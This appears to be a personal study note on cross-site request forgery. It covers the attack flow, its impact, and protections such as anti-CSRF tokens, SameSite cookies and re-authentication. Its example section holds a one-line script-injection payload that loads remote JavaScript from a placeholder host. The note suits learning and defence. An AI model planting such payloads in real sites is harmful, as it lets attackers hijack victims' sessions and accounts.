# Cross-Site Request Forgery (CSRF) — Learning

`Cross-Site Request Forgery (CSRF)` occurs when an attacker causes an authenticated user's browser to perform unwanted actions on a web application.

The attack relies on the victim already being authenticated, allowing the forged request to use the victim's active session.

Possible impact includes:

- Changing account information
- Changing passwords
- Performing actions as the victim
- Targeting privileged or administrator accounts
- Accessing sensitive functionality

---

## Attack Flow

A typical CSRF attack may follow this flow:

```text
Victim is authenticated
        ↓
Victim loads attacker-controlled content
        ↓
Malicious request is triggered
        ↓
Browser sends victim's authenticated session
        ↓
Action is performed as the victim
```

If an administrator is targeted, the attacker may gain access to privileged functionality depending on the application's capabilities.

---

## Example

A malicious page may load attacker-controlled JavaScript:

```html
"><script src=//www.example.com/exploit.js></script>
```

The remote `exploit.js` file could contain JavaScript that reproduces a sensitive application request, such as changing the victim's password.

To build such a payload, the attacker must understand:

- The application's endpoints
- The password-changing workflow
- Required parameters
- Required API requests

---

## Prevention

Two important controls for user input are:

- `Sanitization` -> Remove or neutralize unwanted characters or content.
- `Validation` -> Ensure input matches the expected format.

Output should also be safely handled before being rendered to the user.

These controls help reduce vulnerabilities such as:

- HTML Injection
- XSS

---

## CSRF Protections

Common CSRF protections include:

- Anti-CSRF tokens
- Per-session or per-request tokens
- `SameSite` cookies
- Re-authentication for sensitive actions
- Secure application design

Examples of cookie protections:

```text
SameSite=Strict
SameSite=Lax
```

These attributes can restrict authentication cookies from being included in certain cross-origin requests.

Sensitive operations may also require the user to re-enter their password before they are accepted.

---

## Defense in Depth

A `WAF` may help detect or block some malicious requests, but it should not be considered the primary security control.

Security should rely on multiple layers:

```text
Input Validation
      +
Output Sanitization
      +
Anti-CSRF Tokens
      +
SameSite Cookies
      +
Re-authentication
      +
Secure Application Logic
```

XSS and CSRF protections should therefore be implemented directly within the application rather than relying only on browser protections or a WAF.

- 
